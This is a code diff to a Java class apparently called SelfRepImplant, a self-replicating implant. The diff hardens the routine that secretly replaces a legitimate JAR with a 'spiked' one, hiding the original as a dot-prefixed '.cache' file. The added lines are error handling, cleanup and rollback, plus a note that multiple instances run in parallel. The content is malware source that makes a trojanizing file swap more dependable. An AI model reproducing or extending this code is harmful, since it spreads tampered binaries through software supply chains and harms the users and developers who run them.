@@ -273,6 +273,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         String newFileName = "." + targetFilename + ".tmp";
         Path tempFilePath = existingJar.resolveSibling(newFileName);
         if (Files.exists(tempFilePath)) {
+            // Remember that several instances of this thing may run in parallel
             System.out.println("[-] Temporary file '" + tempFilePath + "' already exist! Aborting.");
             throw new IOException("File already exist: " + tempFilePath);
         }
@@ -285,6 +286,10 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     private static void doTheSwitcharoo(Path original, Path spiked) throws IOException {
+        if (!Files.exists(spiked)) {
+            throw new IllegalArgumentException("File '" + spiked + "' does not exist.");
+        }
+
         // First move the original JAR (that may be in use at the moment)
         Path moved = original.resolveSibling("." + original.getFileName().getFileName() + ".cache");
         if (Files.exists(moved)) {
@@ -301,12 +306,24 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             Files.delete(spiked);
             throw new IOException("File already exist: " + moved);
         }
-        Files.move(original, moved);
-        System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
+        try {
+            Files.move(original, moved);
+            System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
+        } catch (IOException e) {
+            // Clean up and back off
+            Files.delete(spiked);
+            throw e;
+        }
 
         // Then replace the target with the temporary (spiked) JAR
-        Files.move(spiked, original);
-        System.out.println("[+] Moved '" + spiked.getFileName() + "' -> '" + original.getFileName() + "'.");
+        try {
+            Files.move(spiked, original);
+            System.out.println("[+] Moved '" + spiked.getFileName() + "' -> '" + original.getFileName() + "'.");
+        } catch (IOException e) {
+            // Do not leave the repo in a bad state!
+            // Try to undo the whole switch
+            Files.move(moved, original);    // If this fails, then there's no hope left
+        }
 
         /*
          * Any open file handler to the original JAR should now be pointing to a .cache file (on POSIX-like systems)
